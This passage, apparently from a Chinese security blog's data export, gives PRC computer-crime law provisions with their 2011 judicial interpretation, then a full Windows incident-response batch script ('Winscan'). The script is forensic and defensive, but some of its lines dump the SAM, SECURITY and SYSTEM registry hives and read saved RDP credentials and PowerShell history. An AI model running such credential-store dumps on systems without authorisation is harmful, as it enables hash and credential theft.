【非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金;情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。 【提供侵入、非法控制计算机信息系统程序、工具罪】提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚。 单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照各该款的规定处罚。 第二百八十六条 【破坏计算机信息系统罪】违反国家规定，对计算机信息系统功能进行删除、修改、增加、干扰，造成计算机信息系统不能正常运行，后果严重的，处五年以下有期徒刑或者拘役;后果特别严重的，处五年以上有期徒刑。 违反国家规定，对计算机信息系统中存储、处理或者传输的数据和应用程序进行删除、修改、增加的操作，后果严重的，依照前款的规定处罚。 故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，后果严重的，依照第一款的规定处罚。 单位犯前三款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。 第二百八十六条 之一 【拒不履行信息网络安全管理义务罪】网络服务提供者不履行法律、行政法规规定的信息网络安全管理义务，经监管部门责令采取改正措施而拒不改正，有下列情形之一的，处三年以下有期徒刑、拘役或者管制，并处或者单处罚金： (一)致使违法信息大量传播的; (二)致使用户信息泄露，造成严重后果的; (三)致使刑事案件证据灭失，情节严重的; (四)有其他严重情节的。 单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照前款的规定处罚。 有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。 第二百八十七条 【利用计算机实施犯罪的提示性规定】利用计算机实施金融诈骗、盗窃、贪污、挪用公款、窃取国家秘密或者其他犯罪的，依照本法有关规定定罪处罚。 第二百八十七条 之一 【非法利用信息网络罪】利用信息网络实施下列行为之一，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金： (一)设立用于实施诈骗、传授犯罪方法、制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组的; (二)发布有关制作或者销售毒品、枪支、淫秽物品等违禁物品、管制物品或者其他违法犯罪信息的; (三)为实施诈骗等违法犯罪活动发布信息的。 单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。 有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。 第二百八十七条 之二 【帮助信息网络犯罪活动罪】明知他人利用信息网络实施犯罪，为其犯罪提供互联网接入、服务器托管、网络存储、通讯传输等技术支持，或者提供广告推广、支付结算等帮助，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金。 单位犯前款罪的，对单位判处罚金，并对其直接负责的主管人员和其他直接责任人员，依照第一款的规定处罚。 有前两款行为，同时构成其他犯罪的，依照处罚较重的规定定罪处罚。 最高人民法院、最高人民检察院关于办理危害计算机信息系统安全刑事案件应用法律若干问题的解释（2011年）第一条　非法获取计算机信息系统数据或者非法控制计算机信息系统，具有下列情形之一的，应当认定为刑法第二百八十五条第二款规定的“情节严重”： （一）获取支付结算、证券交易、期货交易等网络金融服务的身份认证信息十组以上的； （二）获取第（一）项以外的身份认证信息五百组以上的； （三）非法控制计算机信息系统二十台以上的； （四）违法所得五千元以上或者造成经济损失一万元以上的； （五）其他情节严重的情形。 实施前款规定行为，具有下列情形之一的，应当认定为刑法第二百八十五条第二款规定的“情节特别严重”： （一）数量或者数额达到前款第（一）项至第（四）项规定标准五倍以上的； （二）其他情节特别严重的情形。 明知是他人非法控制的计算机信息系统，而对该计算机信息系统的控制权加以利用的，依照前两款的规定定罪处罚。 第二条　具有下列情形之一的程序、工具，应当认定为刑法第二百八十五条第三款规定的“专门用于侵入、非法控制计算机信息系统的程序、工具”： （一）具有避开或者突破计算机信息系统安全保护措施，未经授权或者超越授权获取计算机信息系统数据的功能的； （二）具有避开或者突破计算机信息系统安全保护措施，未经授权或者超越授权对计算机信息系统实施控制的功能的； （三）其他专门设计用于侵入、非法控制计算机信息系统、非法获取计算机信息系统数据的程序、工具。 第三条　提供侵入、非法控制计算机信息系统的程序、工具，具有下列情形之一的，应当认定为刑法第二百八十五条第三款规定的“情节严重”： （一）提供能够用于非法获取支付结算、证券交易、期货交易等网络金融服务身份认证信息的专门性程序、工具五人次以上的； （二）提供第（一）项以外的专门用于侵入、非法控制计算机信息系统的程序、工具二十人次以上的； （三）明知他人实施非法获取支付结算、证券交易、期货交易等网络金融服务身份认证信息的违法犯罪行为而为其提供程序、工具五人次以上的； （四）明知他人实施第（三）项以外的侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具二十人次以上的； （五）违法所得五千元以上或者造成经济损失一万元以上的； （六）其他情节严重的情形。 实施前款规定行为，具有下列情形之一的，应当认定为提供侵入、非法控制计算机信息系统的程序、工具“情节特别严重”： （一）数量或者数额达到前款第（一）项至第（五）项规定标准五倍以上的； （二）其他情节特别严重的情形。 第四条　破坏计算机信息系统功能、数据或者应用程序，具有下列情形之一的，应当认定为刑法第二百八十六条第一款和第二款规定的“后果严重”： （一）造成十台以上计算机信息系统的主要软件或者硬件不能正常运行的； （二）对二十台以上计算机信息系统中存储、处理或者传输的数据进行删除、修改、增加操作的； （三）违法所得五千元以上或者造成经济损失一万元以上的； （四）造成为一百台以上计算机信息系统提供域名解析、身份认证、计费等基础服务或者为一万以上用户提供服务的计算机信息系统不能正常运行累计一小时以上的； （五）造成其他严重后果的。 实施前款规定行为，具有下列情形之一的，应当认定为破坏计算机信息系统“后果特别严重”： （一）数量或者数额达到前款第（一）项至第（三）项规定标准五倍以上的； （二）造成为五百台以上计算机信息系统提供域名解析、身份认证、计费等基础服务或者为五万以上用户提供服务的计算机信息系统不能正常运行累计一小时以上的； （三）破坏国家机关或者金融、电信、交通、教育、医疗、能源等领域提供公共服务的计算机信息系统的功能、数据或者应用程序，致使生产、生活受到严重影响或者造成恶劣社会影响的； （四）造成其他特别严重后果的。 第五条　具有下列情形之一的程序，应当认定为刑法第二百八十六条第三款规定的“计算机病毒等破坏性程序”： （一）能够通过网络、存储介质、文件等媒介，将自身的部分、全部或者变种进行复制、传播，并破坏计算机系统功能、数据或者应用程序的； （二）能够在预先设定条件下自动触发，并破坏计算机系统功能、数据或者应用程序的； （三）其他专门设计用于破坏计算机系统功能、数据或者应用程序的程序。 第六条　故意制作、传播计算机病毒等破坏性程序，影响计算机系统正常运行，具有下列情形之一的，应当认定为刑法第二百八十六条第三款规定的“后果严重”： （一）制作、提供、传输第五条第（一）项规定的程序，导致该程序通过网络、存储介质、文件等媒介传播的； （二）造成二十台以上计算机系统被植入第五条第（二）、（三）项规定的程序的； （三）提供计算机病毒等破坏性程序十人次以上的； （四）违法所得五千元以上或者造成经济损失一万元以上的； （五）造成其他严重后果的。 实施前款规定行为，具有下列情形之一的，应当认定为破坏计算机信息系统“后果特别严重”： （一）制作、提供、传输第五条第（一）项规定的程序，导致该程序通过网络、存储介质、文件等媒介传播，致使生产、生活受到严重影响或者造成恶劣社会影响的； （二）数量或者数额达到前款第（二）项至第（四）项规定标准五倍以上的； （三）造成其他特别严重后果的。 第七条　明知是非法获取计算机信息系统数据犯罪所获取的数据、非法控制计算机信息系统犯罪所获取的计算机信息系统控制权，而予以转移、收购、代为销售或者以其他方法掩饰、隐瞒，违法所得五千元以上的，应当依照刑法第三百一十二条第一款的规定，以掩饰、隐瞒犯罪所得罪定罪处罚。 实施前款规定行为，违法所得五万元以上的，应当认定为刑法第三百一十二条第一款规定的“情节严重”。 单位实施第一款规定行为的，定罪量刑标准依照第一款、第二款的规定执行。 第八条　以单位名义或者单位形式实施危害计算机信息系统安全犯罪，达到本解释规定的定罪量刑标准的，应当依照刑法第二百八十五条、第二百八十六条的规定追究直接负责的主管人员和其他直接责任人员的刑事责任。 第九条　明知他人实施刑法第二百八十五条、第二百八十六条规定的行为，具有下列情形之一的，应当认定为共同犯罪，依照刑法第二百八十五条、第二百八十六条的规定处罚： （一）为其提供用于破坏计算机信息系统功能、数据或者应用程序的程序、工具，违法所得五千元以上或者提供十人次以上的； （二）为其提供互联网接入、服务器托管、网络存储空间、通讯传输通道、费用结算、交易服务、广告服务、技术培训、技术支持等帮助，违法所得五千元以上的； （三）通过委托推广软件、投放广告等方式向其提供资金五千元以上的。 实施前款规定行为，数量或者数额达到前款规定标准五倍以上的，应当认定为刑法第二百八十五条、第二百八十六条规定的“情节特别严重”或者“后果特别严重”。 第十条　对于是否属于刑法第二百八十五条、第二百八十六条规定的“国家事务、国防建设、尖端科学技术领域的计算机信息系统”、“专门用于侵入、非法控制计算机信息系统的程序、工具”、“计算机病毒等破坏性程序”难以确定的，应当委托省级以上负责计算机信息系统安全保护管理工作的部门检验。司法机关根据检验结论，并结合案件具体情况认定。 第十一条　本解释所称“计算机信息系统”和“计算机系统”，是指具备自动处理数据功能的系统，包括计算机、网络设备、通信设备、自动化控制设备等。 本解释所称“身份认证信息”，是指用于确认用户在计算机信息系统上操作权限的数据，包括账号、口令、密码、数字证书等。 本解释所称“经济损失”，包括危害计算机信息系统犯罪行为给用户直接造成的经济损失，以及用户为恢复数据、功能而支出的必要费用。 网络安全监管单位 网信办 工信部 网安 网络违法犯罪举报网址：https://www.12377.cn/ https://www.12321.cn/ 督察部门（受理群众电话、网络举报，督导“扫黑除恶”专项斗争进展） 刑侦部门（刑侦部门作为主力军，要广泛搜集涉黑涉恶违法犯罪线索，研究打击对策，侦办涉黑涉恶案件，实施专案打击，确保打掉一批涉黑恶犯罪团伙） 治安部门（各派出所加强对娱乐、物流等行业和高危人员的管控，并从黄赌案件中发现打击） 经侦部门（经济领域） 网安部门（打击网络黑产犯罪，重拳打击电信网络诈骗、网络赌博、网络水军等突出违法犯罪团伙手机黑卡、网络黑号源头。） 禁毒部门（毒品犯罪） 交管部门（车牌驾驶证管理） 技侦部门（利用科学仪器或技术手段收集、保全证据，或对已收集的证据进行分析鉴定的活动） 国保部门（国保支队主要承担维护本地社会政治稳定和国内安全保卫基础调查、情报信息、秘密力量建设、重点对象和阵地控制等基础性工作。负责侦破危害国家安全和社会政治稳定的有关案事件） 法制部门（负责指导、监督、检查全市公安法制建设和执法工作） 技术侦查的措施通常包括：电子侦听、电话监听、电子监控、秘密拍照、录像、进行邮件检查等秘密的专门技术手段。广义的技术侦察措施还包括：无线电侦察、航空侦察、卫星侦察等。","tags":["安全管理"],"categories":["安全体系"]},{"title":"一键Windows应急响应检测脚本","path":"/2022/04/03/winscan/","content":"Winscan一键Windows应急响应检测脚本 实现功能： 说明：运行本脚本需要管理员权限。 信息收集相关： 操作系统信息 系统补丁情况(*) 系统账户和用户组(*) 域密码策略 管理员组 用户上次登录时间 重要的注册表项 RDP保存的凭证 是否开启远程桌面服务 本机共享列表(*) 系统启动信息(*) 已安装的反病毒软件 防火墙配置(*) Defender检测到的活动和过去的恶意软件威胁 防火墙日志和系统日志evtx收集 已安装软件(*) 计划任务(*) 服务状态(*) 自启动服务 自启动目录 注册表启动项(*) 网络连接（ipc$ 命名管道连接） 是否启用Windows剪切板历史记录 用户登录初始化、管理员自动登录 Logon Scripts 屏幕保护程序 AppInit_DLLs COM劫持(*) shim数据库是否被劫持 进程注入 exe文件启动相关注册表 Lsa 映像劫持 接受最终用户许可协议的程序 安全模式启动相关注册表 powershell命令记录(*) IE浏览器记录 certutil下载记录 最近访问的文件(*) “我的电脑、此电脑、计算机”的任意文件夹地址栏内的历史记录 【运行】的历史记录 网络连接情况(*) DNS缓存记录(*) 进程(*) 系统日志是否开启 调查取证相关： SAM、SECURITY、SYSTEM(*) Sysmon 日志(*) SRUM (System Resource Usage Monitor)(*) MUICache(*) ShimCache(*) Prefetch(*) 系统日志(*) Winscan.batecho offcolor 0f::call:colorys调用底部:colorys::02为颜色设置，0指定输出文字背景颜色，2指定文字颜色::输出不能包含符号 / : ? * &quot; &gt; &lt; | \\cd %~dp0for /f &quot;delims=&quot; %%A in (&#x27;dir /s /b %WINDIR%\\system32\\*htable.xsl&#x27;) do set &quot;var=%%A&quot;if not exist ./eventlog/ (md eventlog)if not exist ./schtasks/ (md schtasks)if not exist ./Prefetch/ (md Prefetch)if not exist ./hive/ (md hive)if not exist ./CryptnetURLCache/ (md CryptnetURLCache)if exist out.html (del out.html)::reg query HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Namescall:colorys 0A &quot;[+] 正在查询系统相关信息：&quot;@echo.wmic OS get Caption,CSDVersion,OSArchitecture,Versionwmic computersystem list briefcall:colorys 0A &quot;[+] 正在查询系统补丁情况，并写入文件：&quot;wmic qfe get Description,HotFixID,InstalledOn /format:&quot;%var%&quot; &gt;&gt; out.html@echo.call:colorys 0A &quot;[+] 正在查询系统账户和用户组，并写入文件：&quot;@echo.wmic UserAccount get name,description,sid,disabledwmic UserAccount get Description,Disabled,LocalAccount,Lockout,Name,PasswordChangeable,PasswordExpires,PasswordRequired,SID,Status /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic group get Description,Domain,Name,SID,Status /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic volume get Label,DeviceID,DriveLetter,FileSystem,FreeSpace /format:&quot;%var%&quot; &gt;&gt; out.htmlcall:colorys 0A &quot;[+] 正在检查域密码策略：&quot;@echo.Net accounts /domain@echo.call:colorys 0A &quot;[+] 检查管理员组：&quot;@echo.net localgroup administratorsnet group &quot;domain admins&quot; /domain@echo.call:colorys 0A &quot;[+] 检查用户上次登录时间：&quot;@echo.wmic netlogin get name,lastlogon,badpasswordcountcall:colorys 0A &quot;[+] 检查重要的注册表项：&quot;@echo.::SSPreg query hklm\\system\\currentcontrolset\\control\\lsa /v &quot;Security Packages&quot;::WDigest，1代表开启，0代表明文密码不会出现在内存中reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential@echo.call:colorys 0A &quot;[+] 检查RDP保存的凭证：&quot;@echo.reg query &quot;HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers&quot; /sreg query &quot;HKCU\\Software\\Microsoft\\Terminal Server Client\\Servers&quot; /s &gt; rdp_certificate.txtcall:colorys 0A &quot;[+] 检查是否开启远程桌面服务：&quot;::开启则返回0x00reg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnectionscall:colorys 0A &quot;[+] 检查本机共享列表，并写入文件：&quot;net shareWmic share get name,path,status /format:&quot;%var%&quot; &gt;&gt; out.htmlcall:colorys 0A &quot;[+] 检查系统启动信息，并写入文件：&quot;@echo.wmic startup get command,caption,Location,Userwmic startup get command,caption,Location,User /format:&quot;%var%&quot; &gt;&gt; out.html@echo.call:colorys 0A &quot;[+] 检查已安装反病毒软件：&quot;@echo.wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe@echo.call:colorys 0A &quot;[+] 检查防火墙配置，并写入文件：&quot;netsh firewall show confignetsh firewall show config &gt; firewall_config.txt@echo.call:colorys 0A &quot;[+] 检查Defender检测到的活动和过去的恶意软件威胁：&quot;@echo.powershell Get-MpThreatDetectioncall:colorys 0A &quot;[+] 正在拷贝防火墙日志和evtx：&quot;@echo.if exist %windir%\\system32\\logfiles\\firewall\\pfirewall.log (copy /Y %windir%\\system32\\logfiles\\firewall\\pfirewall.log)copy /Y &quot;C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Windows Defender%%4Operational.evtx&quot; .\\eventlog\\@echo.call:colorys 0A &quot;[+] 检查已安装软件，并写入文件：&quot;@echo.reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName | findstr DisplayNamewmic PRODUCT get Description,InstallDate,InstallLocation,Vendor,Version /format:&quot;%var%&quot; &gt;&gt; out.html@echo.call:colorys 0A &quot;[+] 检查计划任务，拷贝日志和计划任务文件&quot;reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree&quot;schtasks /query /fo LIST /v &gt; .\\schtasks\\schtasks.txtfor %%i in (C:\\Windows\\System32\\Tasks\\*) do copy /Y %%i schtasks\\::for %%i in (C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TaskSche*) do copy /Y %%i schtasks\\copy /Y C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-TaskScheduler%%4Operational.evtx .\\eventlog\\copy /Y C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-SMBServer%%4Security.evtx .\\eventlog\\@echo.call:colorys 0A &quot;[+] 检查服务状态，并写入文件：&quot;powershell Get-Servicepowershell $aa=&quot;gwmi win32_service | ft -Property Name, DisplayName, PathName, User, State &gt; service.txt&quot;;$aawmic service get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:&quot;%var%&quot; &gt;&gt; out.htmlcall:colorys 0A &quot;[+] 检查自启动服务：&quot;@echo.::RunSrvicese:win7、win10、2012reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOncereg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOncereg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\Currention\\RunOncereg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceVers@echo.call:colorys 0A &quot;[+] 检查自启动目录：&quot;@echo.dir /a &quot;%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup&quot;dir /a &quot;C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp&quot;dir /a &quot;%SystemDrive%\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup&quot;@echo.call:colorys 0A &quot;[+] 检查注册表启动项，写入文件中：&quot;@echo.reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\run &gt;qidong.txtreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce &gt;&gt;qidong.txtreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run &gt;&gt;qidong.txtreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce &gt;&gt;qidong.txtreg query HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run &gt;&gt;qidong.txtreg query HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce &gt;&gt;qidong.txtreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\run &gt;&gt;qidong.txtreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\run &gt;&gt;qidong.txtreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartMenu &gt;&gt;qidong.txtreg query &quot;HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot; /v Load &gt;&gt;qidong.txt@echo.call:colorys 0A &quot;[+] 检查网络连接（ipc$ 命名管道连接），并写入文件：&quot;@echo.net usewmic netuse get ConnectionState,Description,DisplayType,LocalName,Name,Persistent,RemoteName,ResourceType,Status,UserName /format:&quot;%var%&quot; &gt;&gt; out.htmlcall:colorys 0A &quot;[+] 检查是否启用Windows剪切板历史记录：(0x1代表启用，适用Win10）：&quot;@echo.reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Clipboard /v EnableClipboardHistory@echo.call:colorys 0A &quot;[+] 检查用户登录初始化、管理员自动登录：&quot;reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; /v Userinitreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot; /v AutoAdminLogoncall:colorys 0A &quot;[+] 检查Logon Scripts:&quot;reg query HKCU\\Environment /v UserInitMprLogonScript@echo.call:colorys 0A &quot;[+] 检查屏幕保护程序：&quot;reg query &quot;HKCU\\Control Panel\\Desktop&quot; /v SCRNSAVE.EXE@echo.call:colorys 0A &quot;[+] 检查AppInit_DLLs：&quot;reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot; /v AppInit_DLLsreg query &quot;HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot; /v AppInit_DLLscall:colorys 0A &quot;[+] 检查COM劫持，并写入文件：&quot;::通过修改注册表键值，使特定的clsid指向恶意的dll，程序运行时就会加载恶意的dllreg query HKCU\\Software\\Classes\\CLSID /s /t REG_SZ &gt; 32os_32pe_and_64os_64pe.txtreg query HKCU\\Software\\Classes\\Wow6432Node\\CLSID /s /t REG_SZ &gt; x86OS_x64pe.txt@echo.call:colorys 0A &quot;[+] 检查shim数据库是否被劫持：&quot;@echo.::主要解决应用兼容性问题的解决方法，执行被劫持的程序时自动加载数据库中恶意模块（dll，shellcode等）reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom&quot;reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB&quot; /sdir /a /b C:\\Windows\\AppPatch\\Customdir /a /b C:\\Windows\\AppPatch\\Custom\\Custom64@echo.call:colorys 0A &quot;[+] 检查进程注入：&quot;@echo.reg query &quot;HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls&quot;@echo.call:colorys 0A &quot;[+] 检查exe文件启动相关注册表：&quot;reg query HKLM\\software\\classes\\exefile\\shell\\open\\commandcall:colorys 0A &quot;[+] 检查Lsa，用于hash传递攻击：&quot;reg query HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmincall:colorys 0A &quot;[+] 检查映像劫持：&quot;rem 适用于windows 2008/win7reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options&quot; -s -f &quot;.exe&quot; -v Debuggerreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options&quot; /s /f &quot;.exe&quot; /v GlobalFlagreg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit&quot;@echo.call:colorys 0A &quot;[+] 查询接受最终用户许可协议的程序：&quot;reg query HKCU\\Software\\SysInternals@echo.call:colorys 0A &quot;[+] 查询安全模式启动相关注册表：&quot;@echo.reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /v AlternateShellcall:colorys 0A &quot;[+] 查询powershell命令记录，拷贝中：&quot;@echo.::适用于powershell高版本if exist %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txtcopy /Y C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%%4Operational.evtx .\\eventlog\\@echo.call:colorys 0A &quot;[+] 检查IE浏览器记录：&quot;reg query &quot;HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs&quot;call:colorys 0A &quot;[+] 检查CryptnetURLCache，查看certutil下载记录：&quot;::利用工具：CryptnetURLCacheParser@echo.if exist C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache (xcopy /s /q /h /o /y C:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache .\\CryptnetUrlCache\\)if exist C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache (xcopy /s /q /h /o /y C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache .\\CryptnetUrlCache\\)if exist %USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache (xcopy /s /q /h /o /y %USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache .\\CryptnetUrlCache\\ )@echo.call:colorys 0A &quot;[+] 检查最近访问的文件，写入文件中：&quot;@echo.dir /a %AppData%\\Microsoft\\Windows\\Recent &gt; Recent.txtif exist &quot;%SYSTEMROOT%\\Documents and Settings\\%USERPROFILE%\\Recent\\&quot; (dir /a %SYSTEMROOT%\\Documents and Settings\\%USERPROFILE%\\Recent\\ &gt;&gt;Recent.txt)dir /a %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Office\\Recent\\ &gt;&gt;Recent.txt@echo.call:colorys 0A &quot;[+] 检查&quot;我的电脑、此电脑、计算机&quot;的任意文件夹地址栏内的历史记录：&quot;reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPathscall:colorys 0A &quot;[+] 检查【运行】的历史记录：&quot;reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRUcall:colorys 0A &quot;[+] 检查网络连接情况，并写入文件：&quot;@echo.netstat -anob | findstr ESTABLISHED::适用于Win10，Win7不适用powershell $aa=&quot;Get-NetTCPConnection | select LocalAddress,localport,remoteaddress,remoteport,state,@&#123;name=\\&quot;process\\&quot;;Expression=&#123;(get-process -id $_.OwningProcess).ProcessName&#125;&#125;, @&#123;Name=\\&quot;cmdline\\&quot;;Expression=&#123;(Get-WmiObject Win32_Process -filter \\&quot;ProcessId = $($_.OwningProcess)\\&quot;).commandline&#125;&#125; | sort Remoteaddress -Descending | ft -wrap -autosize &gt; network_tcp.txt&quot;;$aa@echo.call:colorys 0A &quot;[+] 检查DNS缓存记录，并写入文件中：&quot;::适用win10，win7不适用@echo.powershell $aa=&quot;Get-DnsClientCache |ft -wrap -autosize&quot;;$aaipconfig /displaydns &gt; dns_cache.txtcall:colorys 0A &quot;[+] 检查进程，写入文件中：&quot;wmic process get name,ParentProcessId,processid,executablepath,CreationDate,commandline /format:&quot;%var%&quot; &gt;&gt; out.htmlwmic process get name,parentprocessid,processid,executablepath,CreationDate,commandline /format:csv &gt; process.csvpowershell $aa=&quot;gwmi win32_process | Select Name, ProcessID, @&#123;n=&#x27;Owner&#x27;;e=&#123;$_.GetOwner().User&#125;&#125;,CommandLine | ft -wrap -autosize &gt; process_ps.txt&quot;;$aa@echo.call:colorys 0A &quot;[+] 调查取证——导出SAM、SECURITY、SYSTEM（记录系统运行的可执行文件的完整路径和最后的执行日期）：&quot;::可用Registry Explorer对SYSTEM文件进行分析，AppCompatCache记录程序的修改时间，一定程度上可以确定程序的最迟运行时间@echo.reg save hklm\\system .\\hive\\SYSTEM /Yreg save hklm\\sam .\\hive\\SAM /Yreg save hklm\\security .\\hive\\SECURITY /Ycall:colorys 0A &quot;[+] 调查取证——收集 Sysmon 日志：&quot;if exist C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%%4Operational.evtx (copy /Y &quot;C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-Sysmon%%4Operational.evtx&quot; .\\eventlog\\)call:colorys 0A &quot;[+] 调查取证——检查BAM（记录系统运行的可执行文件的完整路径和最后的执行日期，适用于Win10），写入文件中：&quot;@echo.reg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\state\\UserSettings&quot; /s &gt; BAM.txtcall:colorys 0A &quot;[+] 调查取证——SRUM (System Resource Usage Monitor)，拷贝中：&quot;if exist C:\\Windows\\System32\\sru\\SRUDB.dat (copy /Y C:\\Windows\\System32\\sru\\SRUDB.dat)@echo.call:colorys 0A &quot;[+] 调查取证——MUICache (从exe文件的版本资源中提取应用程序名、公司名)，写入文件中：&quot;reg query &quot;HKCU\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache&quot; &gt; MuiCache.txt@echo.call:colorys 0A &quot;[+] 调查取证——ShimCache (跟踪文件路径、上次修改时间和是否被执行)，注册表导出中：&quot;@echo.reg export &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache&quot; ShimCache.reg /Ycall:colorys 0A &quot;[+] 调查取证——Prefetch (会保存文件第一次和最后一次运行日期、路径和执行次数等信息)，拷贝中&quot;@echo.::for %%i in (C:\\Windows\\Prefetch\\*) do copy /Y %%i Prefetch\\xcopy /s /q /h /o /y C:\\Windows\\Prefetch .\\Prefetch\\call:colorys 0A &quot;[+] 检查系统日志是否有开启：&quot;reg query HKLM\\SYSTEM\\CurrentControlSet\\services\\eventlogcall:colorys 0A &quot;[+] 正在导出系统日志：&quot;if exist .\\eventlog\\system.evtx (del .\\eventlog\\system.evtx)wevtutil epl System .\\eventlog\\system.evtxif exist .\\eventlog\\Application.evtx (del .\\eventlog\\Application.evtx)wevtutil epl Application .\\eventlog\\Application.evtxif exist .\\eventlog\\Security.evtx (del .\\eventlog\\Security.evtx)wevtutil epl Security .\\eventlog\\Security.evtxrem 远程桌面日志，筛选1149if exist .\\eventlog\\TerminalServices.evtx (del .\\eventlog\\TerminalServices.evtx)wevtutil epl Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational .\\eventlog\\TerminalServices.evtx@echo.pause::把以下代码放到批处理底部用call调用:coloryspushd %tmp%&amp;echo CCAICCAI&gt;%2-&amp;certutil /f /decode %2- %2- 1&gt;nul 2&gt;nulfindstr /a:%1 . %2- \\ 2&gt;nul&amp;del /q /f %2- 1&gt;nul 2&gt;nul&amp;popd&amp;exit /b","tags":["应急响应","Winscan"],"categories":["安全工具"]},{"title":"英伟达泄露 NVIDIA 